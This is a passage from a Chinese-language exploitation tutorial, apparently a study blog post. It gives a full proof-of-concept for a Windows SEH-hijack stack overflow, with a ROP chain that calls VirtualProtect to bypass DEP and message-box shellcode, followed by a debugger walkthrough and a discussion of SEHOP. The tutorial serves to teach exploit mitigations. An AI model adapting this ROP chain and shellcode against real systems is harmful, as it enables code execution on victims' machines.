class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdint&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;tchar.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">uint8_t</span> Exploit[] =</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;AAAAAAAAAAAAAAAA&quot;</span> <span class="comment">// 16 bytes for buffer length</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;AAAA&quot;</span> <span class="comment">// Stack Cookie</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;AAAA&quot;</span> <span class="comment">// EBP</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;AAAA&quot;</span> <span class="comment">// Return address</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;AAAA&quot;</span> <span class="comment">// Overflow() | Param #1 | pInputBuf</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;AAAA&quot;</span> <span class="comment">// Overflow() | Param #2 | dwInputBufSize</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;DDDD&quot;</span> <span class="comment">// EXECEPTION_REGISTRATION_RECORD.Next</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\xf3\x28\x0f\x66&quot;</span><span class="comment">// EXECEPTION_REGISTRATION_RECORD.Handler | 0x660f28f3 | ADD ESP, 0x1004; RET</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\xf9\x28\x0f\x66&quot;</span> <span class="comment">// 0x660F28F9 | ROPNOP</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ROP chain begins</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// EAX = NOP sled</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ECX = Old protection (writable address)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// EDX = PAGE_EXECUTE_READWRITE</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// EBX = Size</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// EBP = VirtualProtect return address (JMP ESP)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ESI = KERNEL32.DLL!VirtualProtect</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// EDI = ROPNOP</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x54\x1e\x00\x66&quot;</span> <span class="comment">// 0x66001e54 | Gadget #1 | POP ESI ; RET</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\xd0\x10\x00\x66&quot;</span> <span class="comment">// 0x660010d0 -&gt; ESI | &lt;msvbvm60.dll!VirtualProtect thunk&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\xfc\x50\x05\x66&quot;</span> <span class="comment">// 0x660550fc | Gadget #2 | MOV EAX, DWORD [ESI] ; POP ESI; RET</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\xef\xbe\xad\xde&quot;</span> <span class="comment">// Junk</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\xf8\x9f\x0f\x66&quot;</span> <span class="comment">// 0x660f9ff8 | Gadget #3 | XCHG EAX, ESI; RET</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x1f\x98\x0e\x66&quot;</span> <span class="comment">// 0x660e981f | Gadget #4 | POP EAX; RET</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90&quot;</span> <span class="comment">// NOP sled -&gt; EAX | JMP ESP will point here</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\xf0\x1d\x00\x66&quot;</span> <span class="comment">// 0x66001df0 | Gadget #5 | POP EBP; RET</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\xea\xcb\x01\x66&quot;</span> <span class="comment">// 0x6601CBEA -&gt; EBP |</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x10\x1f\x00\x66&quot;</span> <span class="comment">// 0x66001f10 | Gadget #6 | POP EBX; RET</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x00\x20\x00\x00&quot;</span> <span class="comment">// 0x2000 -&gt; EBX | VirtualProtect() | Param #2 | dwSize</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x21\x44\x06\x66&quot;</span> <span class="comment">// 0x66064421 | Gadget #7 | POP EDX; RET</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x40\x00\x00\x00&quot;</span> <span class="comment">// 0x40 -&gt; EDX | VirtualProtect() | Param #3 | flNewProtect | PAGE_EXECUTE_READWRITE</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\xf2\x1f\x00\x66&quot;</span> <span class="comment">// 0x66001ff2 | Gadget #8 | POP ECX; RET</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x00\xa0\x10\x66&quot;</span> <span class="comment">// 0x6610A000 -&gt; ECX | VirtualProtect() | Param #4 | lpflOldProtect</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x5b\x57\x00\x66&quot;</span> <span class="comment">// 0x6600575b | Gadget #9 | POP EDI; RET</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\xf9\x28\x0f\x66&quot;</span> <span class="comment">// 0x660F28F9 -&gt; EDI |</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x54\x12\x05\x66&quot;</span> <span class="comment">// 0x66051254 | Gadget #10 | PUSHAD; RET</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 0x660F28F9 | Gadget #11 | ROPNOP | returns into VirtualProtect</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 0x6601CBEA | Gadget #12 | PUSH ESP; RET | return address from VirtualProtect</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Shellcode</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x55\x89\xe5\x68\x88\x4e\x0d\x00\xe8\x53\x00\x00\x00\x68\x86\x57&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x0d\x00\x50\xe8\x94\x00\x00\x00\x68\x33\x32\x00\x00\x68\x55\x73&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x65\x72\x54\xff\xd0\x68\x1a\xb8\x06\x00\x50\xe8\x7c\x00\x00\x00&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x6a\x64\x68\x70\x77\x6e\x65\x89\xe1\x68\x6e\x65\x74\x00\x68\x6f&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x72\x72\x2e\x68\x65\x73\x74\x2d\x68\x66\x6f\x72\x72\x68\x77\x77&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x77\x2e\x89\xe2\x6a\x00\x52\x51\x6a\x00\xff\xd0\x89\xec\x5d\xc3&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x55\x89\xe5\x57\x56\xbe\x30\x00\x00\x00\x64\xad\x8b\x40\x0c\x8b&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x78\x18\x89\xfe\x31\xc0\xeb\x04\x39\xf7\x74\x28\x85\xf6\x74\x24&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x8d\x5e\x24\x85\xdb\x74\x14\x8b\x4b\x04\x85\xc9\x74\x0d\x6a\x01&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x51\xe8\x5d\x01\x00\x00\x3b\x45\x08\x74\x06\x31\xc0\x8b\x36\xeb&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\xd7\x8b\x46\x10\x5e\x5f\x89\xec\x5d\xc2\x04\x00\x55\x89\xe5\x81&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\xec\x30\x02\x00\x00\x8b\x45\x08\x89\x45\xf8\x8b\x55\xf8\x03\x42&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot; \x83\xc0\x04\x89\x45\xf0\x83\xc0\x14\x89\x45\xf4\x89\xc2\x8b&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x45\x08\x03\x42\x60\x8b\x4a\x64\x89\x4d\xd0\x89\x45\xfc\x89\xc2&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x8b\x45\x08\x03\x42\x20\x89\x45\xec\x8b\x55\xfc\x8b\x45\x08\x03&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x42\x24\x89\x45\xe4\x8b\x55\xfc\x8b\x45\x08\x03\x42\x1c\x89\x45&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\xe8\x31\xc0\x89\x45\xe0\x89\x45\xd8\x8b\x45\xfc\x8b\x40\x18\x3b&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x45\xe0\x0f\x86\xd2\x00\x00\x00\x8b\x45\xe0\x8d\x0c\x85\x00\x00&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x00\x00\x8b\x55\xec\x8b\x45\x08\x03\x04\x11\x89\x45\xd4\x6a\x00&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x50\xe8\xbd\x00\x00\x00\x3b\x45\x0c\x0f\x85\xa1\x00\x00\x00\x8b&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x45\xe0\x8d\x14\x00\x8b\x45\xe4\x0f\xb7\x04\x02\x8d\x0c\x85\x00&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x00\x00\x00\x8b\x55\xe8\x8b\x45\x08\x03\x04\x11\x89\x45\xd8\x8b&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x4d\xfc\x89\xca\x03\x55\xd0\x39\xc8\x7c\x7f\x39\xd0\x7d\x7b\xc7&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x45\xd8\x00\x00\x00\x00\x31\xc9\x8d\x9d\xd0\xfd\xff\xff\x8a\x14&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x08\x80\xfa\x00\x74\x20\x80\xfa\x2e\x75\x15\xc7\x03\x2e\x64\x6c&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x6c\x83\xc3\x04\xc6\x03\x00\x8d\x9d\xd0\xfe\xff\xff\x41\xeb\xde&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x88\x13\x41\x43\xeb\xd8\xc6\x03\x00\x8d\x9d\xd0\xfd\xff\xff\x6a&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x00\x53\xe8 \x00\x00\x00\x50\xe8\xa3\xfe\xff\xff\x85\xc0\x74&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x29\x89\x45\xdc\x6a\x00\x8d\x95\xd0\xfe\xff\xff\x52\xe8\x21\x00&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x00\x00\x50\xff\x75\xdc\xe8\xd1\xfe\xff\xff\x89\x45\xd8\xeb\x0a&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x8d\x45\xe0\xff\x00\xe9\x1f\xff\xff\xff\x8b\x45\xd8\x89\xec\x5d&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\xc2\x08\x00\x55\x89\xe5\x57\x8b\x4d\x08\x8b\x7d\x0c\x31\xdb\x80&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x39\x00\x74\x14\x0f\xb6\x01\x0c\x60\x0f\xb6\xd0\x01\xd3\xd1\xe3&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x41\x85\xff\x74\xea\x41\xeb\xe7\x89\xd8\x5f\x89\xec\x5d\xc2\x08&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x00&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Overflow</span><span class="params">(<span class="type">uint8_t</span>* pInputBuf, <span class="type">uint32_t</span> dwInputBufSize)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="type">char</span> Buf[<span class="number">16</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">memcpy</span>(Buf, pInputBuf, dwInputBufSize);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int32_t</span> <span class="title">wmain</span><span class="params">(<span class="type">int32_t</span> nArgc, <span class="type">const</span> <span class="type">wchar_t</span>* pArgv[])</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="type">char</span> Junk[<span class="number">0x5000</span>] = &#123; <span class="number">0</span> &#125;; <span class="comment">// Move ESP lower to ensure the exploit data can be accomodated in the overflow</span></span><br><span class="line"></span><br><span class="line">	HMODULE hModule = <span class="built_in">LoadLibraryW</span>(<span class="string">L&quot;msvbvm60.dll&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	__asm &#123;</span><br><span class="line"></span><br><span class="line">		Push0xdeadc0de<span class="comment">// Address of handler function</span></span><br><span class="line"></span><br><span class="line">		PushFS : [<span class="number">0</span>]<span class="comment">// Address of previous handler</span></span><br><span class="line"></span><br><span class="line">		Mov FS : [<span class="number">0</span>] , Esp<span class="comment">// Install new EXECEPTION_REGISTRATION_RECORD</span></span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	_tprintf(_T(<span class="string">&quot;... loaded non-ASLR/non-SafeSEH module msvbvm60.dll to 0x%p\r\n&quot;</span>), hModule);</span><br><span class="line"></span><br><span class="line">	_tprintf(_T(<span class="string">&quot;... passing %d bytes of data to vulnerable function\r\n&quot;</span>), <span class="built_in">sizeof</span>(Exploit) - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">Overflow</span>(Exploit, <span class="number">0x20000</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面的代码中有几个细节值得注意。首先，您可能注意到，我通过将垃圾异常处理程序（0xdeadc0de）链接到TEB(FS[0])中的处理程序列表，显式注册了该处理程序。之所以这样做，是因为我发现在栈顶部覆盖NTDLL.DLL注册的默认处理程序的做法不太可靠。这是因为有时栈的顶端没有足够的空间来容纳shellcode，这会触发VirtualProtect的STATUS_CONFICTING_ADDRESS错误（代码0xc0000015）。</p>
<p>图20中另一个值得注意的细节是，我在ROP链末端的溢出内容中加入了自己的shellcode。这是我编写的一个自定义的shellcode（源代码可以从Github上下载），它在ROP链化后的栈上被执行后会弹出一个消息框。</p>
<p>编译完含有溢出漏洞程序后，我们可以进行单步跟踪，看看溢出数据是如何结合在一起来执行shellcode的。</p>
<p>(上面那段代码的内联汇编语法有错误，不知道是他写的有问题还是我的设置问题，报错信息为C2400	“操作码”中的内联汇编语法错误；找到“[”，所以下面都是别人的图)</p>
<p>在漏洞程序发生栈溢出之前的状态</p>
<p><img src="/.io//../../../../OneDrive%20-%20office/OneDrive/%E6%96%87%E6%A1%A3%20%E7%AC%94%E8%AE%B0/%E6%A0%88%E6%BA%A2%E5%87%BA/Picture28.png" alt="img"></p>
<p>在第一个断点处，我们可以看到，栈上的目标EXCEPTION_REGISTRATION_RECORD位于0x00B9ABC8处。在发生溢出之后，我们可以期待该handler字段将被我们伪造的SEH handler的地址所覆盖。</p>
<p><img src="/.io//Picture29-1707050428583.png" alt="img"></p>
<p>memcpy对栈末端之外执行写入操作是抛出的访问违例异常（Access violation exception）</p>
<p><img src="/.io//Picture29-1707050428583.png" alt="img"></p>
<p>在memcpy函数中，由于rep MOVSB指令试图将数据写入栈的末端之外的内存时，发生了访问违例异常。在0x00B9ABCC处，我们可以看到EXCEPTION_REGISTRATION_RECORD结构体的handler字段已经被我们msvbvm60.dll中的栈pivot gadget的地址所覆盖。</p>
<p>伪造的SEH handler让ESP跳回由溢出控制的地区</p>
<p><img src="/.io//Picture30-1707050428583.png" alt="img"></p>
<p>在栈中向上跳过0x1004字节，我们可以看到在突出显示区域，ESP现在指向我们ROP链的开始地址。这个ROP链将填充所有相关寄存器的值，以便为PUSHAD gadget做好相应的准备，之后，该gadget将把这些值移到栈上，从而为调用KERNEL32.DLL!VirtualProtect做好准备。</p>
<p> PUSHAD为绕过DEP准备好相应的调用栈</p>
<p><img src="/.io//Picture31-1707050428583.png" alt="img"></p>
<p>在PUSHAD指令执行后，我们可以看到ESP现在指向msvbvm60.dll中的ROPN，其后紧跟KERNEL32.DLL中VirtualProtect的地址。在0x00B9B594处，我们可以看到传递给VirtualProtect的第一个参数，就是我们栈上0x00B9B5A4处的shellcode的地址（该地址在上图中已经突出显示）。</p>
<p>ROP链的最后一个gadget将EIP设置为ESP</p>
<p><img src="/.io//Picture32-1707050428583.png" alt="img"></p>
<p>一旦VirtualProtect返回，ROP链中的最后一个gadget就会将EIP重定向到ESP的值，这样，ESP将指向我们直接存储在ROP链之后的shellcode的起始位置。您可能已经注意到，shellcode的前4个字节实际上就是ROP链通过PUSHAD指令动态生成的NOP指令，而不是通过溢出写入的shellcode的起始位置。</p>
<p>弹出消息框的shellcode在栈上成功执行，从而完成了漏洞的利用过程</p>
<p><img src="/.io//Picture33-1707050428584.png" alt="img"></p>
<h2 id="SEHOP"><a href="#SEHOP" class="headerlink" title="SEHOP"></a>SEHOP</h2><p>实际上，在Windows中还有一种更为强大的SEH劫持缓解机制，称为SEH覆写保护（SEH Overwrite Protection，SEHOP），它可以抗衡这里描述的方法。引入SEHOP的目的，是为了既可以检测EXCEPTION_REGISTRATION_RECORD损坏，又无需重新编译应用程序或依靠每个模块的漏洞利用缓解方案，如SafeSEH。为此，SEHOP将在SEH链的底部引入一个额外的链接，并在异常发生时通过检查是否可以通过遍历SEH链而到达该链接，来实现SEH劫持的防御机制。由于EXCEPTION_REGISTRATION_RECORD的NSEH字段存储在handler字段之前，因此，在通过栈溢出破坏现有的SEH handler时，必然会破坏NSEH，以及破坏整个链（原理上类似于栈金丝雀（stack canary），其中金丝雀就是NSEH字段本身）。SEHOP是在Windows Vista SP1（在默认情况下禁用）和Windows Server 2008（在默认情况下启用）中引入的，在过去的十年中，SEHOP一直处于这种半启用状态（在工作站上禁用，在服务器上启用）。值得注意的是，最近随着Windows 10 v1709的发布，这种情况已经发生了变化：SEHOP已经成为默认启用的漏洞缓解功能了。</p>
<p><img src="/.io//image-20230529162453538-1707050428584.png" alt="image-20230529162453538"></p>
<p>这似乎与上一节在Windows 10虚拟机上探讨的SEH劫持溢出情况相矛盾。为什么SEHOP没有能够在exploit的初始阶段阻止EIP重定向到栈pivot？虽然我们还不是十分清楚，然而这似乎是微软方面配置错误的问题。当我对之前探索溢出所用EXE程序单独进行设置，并手动点选“Override system settings”框后，SEHOP机制就开始发挥威力：栈pivot将无法执行。令人费解的是，在默认情况下，系统已经在该进程上启用了SEHOP机制。</p>
<p>下图为某exe文件，没有手动勾选。</p>
<p><img src="/.io//image-20230529162751462-1707050428584.png" alt="image-20230529162751462"></p>
